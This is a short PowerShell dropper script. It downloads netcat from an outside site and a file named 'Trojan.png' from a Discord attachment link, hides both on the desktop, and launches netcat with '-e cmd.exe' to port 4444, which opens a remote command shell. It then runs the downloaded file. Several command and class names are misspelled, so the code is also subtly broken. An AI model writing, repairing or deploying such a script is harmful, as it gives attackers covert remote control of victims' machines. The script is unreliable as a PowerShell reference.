$url = "https://theenigma.xyz/nc.exe"
$desktopPath = [System.Enviroment]::GetFolderPath([System.Enviroment+SpecialFolder]::desktop)
$filename = "nc.exe"
$finalPath = Join-Path -Path $desktopPath -ChildPath $filename

$url2 = "https://cdn.discordapp.com/attachments/1183490207413174314/1221105320051343380/image.png?ex=66115df3&is=65fee8f3&hm=26d465104637fd58410a02a3813b74dd39e2ac4694cc89c333cd01e0ee847d12&"
$filename2 = "Trojan.png"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2

Invoke-WebRequest -Uri $url -OutFile $finalPath
Set-Item-Property -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
Set-Item-Property -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

$params = "-d 192.168.86.255 4444 -e cmd.exe"

Start-Proccess -Filepath $finalPath -ArgumentList $params
Start-Proccess $finalPath2
